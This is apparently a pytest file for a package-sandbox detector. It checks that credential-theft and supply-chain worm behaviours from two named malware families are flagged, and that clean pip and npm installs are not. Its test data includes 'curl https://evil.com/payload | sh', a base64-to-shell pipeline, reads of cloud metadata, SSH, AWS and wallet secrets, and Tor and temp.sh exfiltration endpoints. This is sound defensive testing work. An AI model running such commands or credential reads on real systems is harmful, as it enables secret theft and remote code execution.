"""
Gate 5 — Behavioral sandbox pattern matching tests.

Covers all 34 named patterns across both attack families:
  - 18 Miasma / Shai-Hulud patterns
  - 16 IronWorm patterns
  - Attack family identification
  - Clean install false-positive prevention
  - Pattern severity classification
  - Summarise findings utility
"""

import pytest
from oss_trust_framework.sandbox.behavioral_patterns import (
    evaluate_sandbox_events,
    has_critical_findings,
    get_attack_family,
    summarise_findings,
    BEHAVIORAL_PATTERNS,
)


# ---------------------------------------------------------------------------
# Pattern inventory
# ---------------------------------------------------------------------------

def test_total_pattern_count():
    """Verify we have the expected number of named patterns."""
    assert len(BEHAVIORAL_PATTERNS) == 34


def test_miasma_patterns_marked_correctly():
    miasma = [p for p in BEHAVIORAL_PATTERNS if p.miasma_specific]
    assert len(miasma) > 0


def test_ironworm_patterns_marked_correctly():
    ironworm = [p for p in BEHAVIORAL_PATTERNS if p.ironworm_specific]
    assert len(ironworm) >= 15


def test_all_critical_patterns_have_descriptions():
    for p in BEHAVIORAL_PATTERNS:
        if p.severity == "CRITICAL":
            assert p.description, f"Pattern {p.id} has no description"


# ---------------------------------------------------------------------------
# Miasma patterns
# ---------------------------------------------------------------------------

def test_miasma_001_imds_aws():
    findings = evaluate_sandbox_events([
        {"type": "network", "value": "http://169.254.169.254/latest/meta-data/"}
    ])
    assert any(f["pattern_id"] == "MIASMA-001" for f in findings)
    assert has_critical_findings(findings)


def test_miasma_002_gcp_metadata():
    findings = evaluate_sandbox_events([
        {"type": "network", "value": "http://metadata.google.internal/computeMetadata/v1/"}
    ])
    assert any(f["pattern_id"] == "MIASMA-002" for f in findings)
    assert has_critical_findings(findings)


def test_miasma_003_azure_imds():
    findings = evaluate_sandbox_events([
        {"type": "network", "value": "http://169.254.169.254/metadata/instance"}
    ])
    assert has_critical_findings(findings)


def test_miasma_004_kubernetes_api():
    findings = evaluate_sandbox_events([
        {"type": "network", "value": "https://kubernetes.default.svc/api/v1/secrets"}
    ])
    assert any(f["pattern_id"] == "MIASMA-004" for f in findings)


def test_miasma_010_github_oidc():
    findings = evaluate_sandbox_events([
        {"type": "network", "value": "https://token.actions.githubusercontent.com"}
    ])
    assert any(f["pattern_id"] == "MIASMA-010" for f in findings)
    assert has_critical_findings(findings)


def test_miasma_011_gcp_oidc():
    findings = evaluate_sandbox_events([
        {"type": "network", "value": "https://oauth2.googleapis.com/token"}
    ])
    assert any(f["pattern_id"] == "MIASMA-011" for f in findings)


def test_cred_001_k8s_service_account():
    findings = evaluate_sandbox_events([
        {"type": "file_read", "value": "/var/run/secrets/kubernetes.io/serviceaccount/token"}
    ])
    assert any(f["pattern_id"] == "CRED-001" for f in findings)
    assert has_critical_findings(findings)


def test_cred_002_gcp_credentials():
    findings = evaluate_sandbox_events([
        {"type": "file_read", "value": "/root/.config/gcloud/application_default_credentials.json"}
    ])
    assert any(f["pattern_id"] == "CRED-002" for f in findings)


def test_cred_003_aws_credentials():
    findings = evaluate_sandbox_events([
        {"type": "file_read", "value": "/root/.aws/credentials"}
    ])
    assert any(f["pattern_id"] == "CRED-003" for f in findings)


def test_cred_004_azure_credentials():
    findings = evaluate_sandbox_events([
        {"type": "file_read", "value": "/root/.azure/credentials"}
    ])
    assert any(f["pattern_id"] == "CRED-004" for f in findings)


def test_cred_005_ssh_keys():
    findings = evaluate_sandbox_events([
        {"type": "file_read", "value": "/root/.ssh/id_rsa"}
    ])
    assert any(f["pattern_id"] == "CRED-005" for f in findings)


def test_publish_001_npm_republish():
    findings = evaluate_sandbox_events([
        {"type": "network", "value": "https://registry.npmjs.org/@redhat/frontend-components"}
    ])
    assert any(f["pattern_id"] == "PUBLISH-001" for f in findings)
    assert has_critical_findings(findings)


def test_publish_002_pypi_upload():
    findings = evaluate_sandbox_events([
        {"type": "network", "value": "https://upload.pypi.org/legacy/"}
    ])
    assert any(f["pattern_id"] == "PUBLISH-002" for f in findings)
    assert has_critical_findings(findings)


def test_env_001_environ_enumeration():
    findings = evaluate_sandbox_events([
        {"type": "env_access", "value": "os.environ.items()"}
    ])
    assert any(f["pattern_id"] == "ENV-001" for f in findings)


def test_env_002_oidc_packages():
    findings = evaluate_sandbox_events([
        {"type": "env_access", "value": "OIDC_PACKAGES=@redhat/pkg"}
    ])
    assert any(f["pattern_id"] == "ENV-002" for f in findings)
    assert has_critical_findings(findings)


def test_env_002_github_token():
    findings = evaluate_sandbox_events([
        {"type": "env_access", "value": "GITHUB_TOKEN=ghp_abc123"}
    ])
    assert any(f["pattern_id"] == "ENV-002" for f in findings)


def test_proc_001_base64_exec():
    findings = evaluate_sandbox_events([
        {"type": "process", "value": "sh -c 'echo aGVsbG8= | base64 -d | sh'"}
    ])
    assert any(f["pattern_id"] == "PROC-001" for f in findings)


def test_proc_002_curl_pipe_shell():
    findings = evaluate_sandbox_events([
        {"type": "process", "value": "curl https://evil.com/payload | sh"}
    ])
    assert any(f["pattern_id"] == "PROC-002" for f in findings)
    assert has_critical_findings(findings)


def test_miasma_full_chain_identifies_family():
    events = [
        {"type": "network",    "value": "https://token.actions.githubusercontent.com"},
        {"type": "network",    "value": "http://metadata.google.internal/"},
        {"type": "network",    "value": "http://169.254.169.254/latest/"},
        {"type": "file_read",  "value": "/var/run/secrets/kubernetes.io/serviceaccount/token"},
        {"type": "network",    "value": "https://registry.npmjs.org/@redhat/pkg"},
        {"type": "env_access", "value": "OIDC_PACKAGES=@redhat/pkg"},
    ]
    findings = evaluate_sandbox_events(events)
    families = get_attack_family(findings)
    assert "Miasma/Shai-Hulud" in families
    assert has_critical_findings(findings)


# ---------------------------------------------------------------------------
# IronWorm patterns
# ---------------------------------------------------------------------------

def test_ironworm_001_tor_onion():
    findings = evaluate_sandbox_events([
        {"type": "network", "value": "http://abc123def456.onion/api/agent"}
    ])
    assert any(f["pattern_id"] == "IRONWORM-001" for f in findings)
    assert has_critical_findings(findings)


def test_ironworm_001b_tor_socks_port():
    findings = evaluate_sandbox_events([
        {"type": "network", "value": "127.0.0.1:9050"}
    ])
    assert any(f["pattern_id"] == "IRONWORM-001b" for f in findings)
    assert has_critical_findings(findings)


def test_ironworm_001c_tempsh_fallback():
    findings = evaluate_sandbox_events([
        {"type": "network", "value": "https://temp.sh/upload/secrets.enc"}
    ])
    assert any(f["pattern_id"] == "IRONWORM-001c" for f in findings)
    assert has_critical_findings(findings)


def test_ironworm_002_ebpf_syscall():
    findings = evaluate_sandbox_events([
        {"type": "process", "value": "BPF_PROG_LOAD fd=3 flags=0"}
    ])
    assert any(f["pattern_id"] == "IRONWORM-002" for f in findings)
    assert has_critical_findings(findings)


def test_ironworm_002b_tools_setup_binary():
    findings = evaluate_sandbox_events([
        {"type": "process", "value": "./tools/setup --collect --output /tmp/out"}
    ])
    assert any(f["pattern_id"] == "IRONWORM-002b" for f in findings)
    assert has_critical_findings(findings)


def test_ironworm_003_openai_key():
    findings = evaluate_sandbox_events([
        {"type": "env_access", "value": "OPENAI_API_KEY=sk-abc123def456"}
    ])
    assert any(f["pattern_id"] == "IRONWORM-003" for f in findings)
    assert has_critical_findings(findings)


def test_ironworm_003_anthropic_key():
    findings = evaluate_sandbox_events([
        {"type": "env_access", "value": "ANTHROPIC_API_KEY=sk-ant-xyz789"}
    ])
    assert any(f["pattern_id"] == "IRONWORM-003" for f in findings)
    assert has_critical_findings(findings)


def test_ironworm_003_gemini_key():
    findings = evaluate_sandbox_events([
        {"type": "env_access", "value": "GEMINI_API_KEY=AIzaSyAbc123"}
    ])
    assert any(f["pattern_id"] == "IRONWORM-003" for f in findings)


def test_ironworm_003_cohere_key():
    findings = evaluate_sandbox_events([
        {"type": "env_access", "value": "COHERE_API_KEY=cohere-abc123"}
    ])
    assert any(f["pattern_id"] == "IRONWORM-003" for f in findings)


def test_ironworm_004_vault_token_file():
    findings = evaluate_sandbox_events([
        {"type": "file_read", "value": "/root/.vault-token"}
    ])
    assert any(f["pattern_id"] == "IRONWORM-004" for f in findings)
    assert has_critical_findings(findings)


def test_ironworm_004b_vault_env():
    findings = evaluate_sandbox_events([
        {"type": "env_access", "value": "VAULT_TOKEN=s.abc123def456xyz"}
    ])
    assert any(f["pattern_id"] == "IRONWORM-004b" for f in findings)
    assert has_critical_findings(findings)


def test_ironworm_005_exodus_wallet():
    findings = evaluate_sandbox_events([
        {"type": "file_read", "value": "/home/.config/Exodus/exodus.wallet"}
    ])
    assert any(f["pattern_id"] == "IRONWORM-005" for f in findings)
    assert has_critical_findings(findings)


def test_ironworm_005b_exodus_root():
    findings = evaluate_sandbox_events([
        {"type": "file_read", "value": "/root/.config/Exodus/exodus.wallet"}
    ])
    assert any(f["pattern_id"] == "IRONWORM-005b" for f in findings)
    assert has_critical_findings(findings)


def test_ironworm_006_npmrc():
    findings = evaluate_sandbox_events([
        {"type": "file_read", "value": "/root/.npmrc"}
    ])
    assert any(f["pattern_id"] == "IRONWORM-006" for f in findings)


def test_ironworm_006b_npm_auth_token():
    findings = evaluate_sandbox_events([
        {"type": "env_access", "value": "NPM_AUTH_TOKEN=npm_abc123def456"}
    ])
    assert any(f["pattern_id"] == "IRONWORM-006b" for f in findings)
    assert has_critical_findings(findings)


def test_ironworm_007_workflow_hijack():
    findings = evaluate_sandbox_events([
        {"type": "file_read", "value": ".github/workflows/release.yml"}
    ])
    assert any(f["pattern_id"] == "IRONWORM-007" for f in findings)
    assert has_critical_findings(findings)


def test_ironworm_full_chain_identifies_family():
    events = [
        {"type": "process",    "value": "./tools/setup --collect"},
        {"type": "process",    "value": "BPF_PROG_LOAD fd=3"},
        {"type": "env_access", "value": "OPENAI_API_KEY=sk-abc"},
        {"type": "env_access", "value": "ANTHROPIC_API_KEY=sk-ant"},
        {"type": "file_read",  "value": "/root/.aws/credentials"},
        {"type": "file_read",  "value": "/root/.config/Exodus/exodus.wallet"},
        {"type": "env_access", "value": "VAULT_TOKEN=s.abc123"},
        {"type": "file_read",  "value": "/root/.npmrc"},
        {"type": "network",    "value": "http://abc.onion/api/agent"},
        {"type": "network",    "value": "https://temp.sh/upload"},
        {"type": "file_read",  "value": ".github/workflows/release.yml"},
    ]
    findings = evaluate_sandbox_events(events)
    families = get_attack_family(findings)
    assert "IronWorm" in families
    assert has_critical_findings(findings)
    assert len(findings) >= 10


def test_both_families_identified_in_combined_attack():
    events = [
        {"type": "network", "value": "169.254.169.254"},          # MIASMA-001
        {"type": "network", "value": "abc123.onion/api/agent"},   # IRONWORM-001
        {"type": "env_access", "value": "OPENAI_API_KEY=sk-abc"}, # IRONWORM-003
        {"type": "env_access", "value": "OIDC_PACKAGES=@pkg"},    # MIASMA ENV-002
    ]
    findings = evaluate_sandbox_events(events)
    families = get_attack_family(findings)
    assert "IronWorm" in families
    assert "Miasma/Shai-Hulud" in families


# ---------------------------------------------------------------------------
# Clean install — no false positives
# ---------------------------------------------------------------------------

def test_clean_pypi_install_no_critical():
    events = [
        {"type": "file_read", "value": "/tmp/pip-build/setup.py"},
        {"type": "process",   "value": "python setup.py install"},
        {"type": "network",   "value": "https://pypi.org/simple/requests/"},
        {"type": "network",   "value": "https://files.pythonhosted.org/packages/requests.tar.gz"},
    ]
    findings = evaluate_sandbox_events(events)
    assert not has_critical_findings(findings)


def test_clean_npm_install_no_critical():
    events = [
        {"type": "file_read", "value": "/tmp/npm-install/package.json"},
        {"type": "process",   "value": "node postinstall.js"},
        {"type": "network",   "value": "https://cdn.npmjs.com/lodash/-/lodash-4.17.21.tgz"},
    ]
    findings = evaluate_sandbox_events(events)
    assert not has_critical_findings(findings)


def test_empty_events_no_findings():
    findings = evaluate_sandbox_events([])
    assert findings == []
    assert not has_critical_findings(findings)
    assert get_attack_family(findings) == []


def test_unknown_event_type_no_findings():
    findings = evaluate_sandbox_events([
        {"type": "unknown_type", "value": "something"},
        {"type": "dns", "value": "pypi.org"},
    ])
    assert not has_critical_findings(findings)


# ---------------------------------------------------------------------------
# Utility functions
# ---------------------------------------------------------------------------

def test_summarise_findings_empty():
    assert "No behavioral indicators" in summarise_findings([])


def test_summarise_findings_with_critical():
    events = [{"type": "network", "value": "abc.onion/c2"}]
    findings = evaluate_sandbox_events(events)
    summary = summarise_findings(findings)
    assert "CRITICAL" in summary
    assert "IronWorm" in summary


def test_summarise_findings_with_miasma():
    events = [{"type": "network", "value": "169.254.169.254"}]
    findings = evaluate_sandbox_events(events)
    summary = summarise_findings(findings)
    assert "CRITICAL" in summary


def test_get_attack_family_empty():
    assert get_attack_family([]) == []


def test_get_attack_family_returns_sorted():
    events = [
        {"type": "network", "value": "169.254.169.254"},
        {"type": "network", "value": "abc.onion"},
    ]
    findings = evaluate_sandbox_events(events)
    families = get_attack_family(findings)
    assert families == sorted(families)
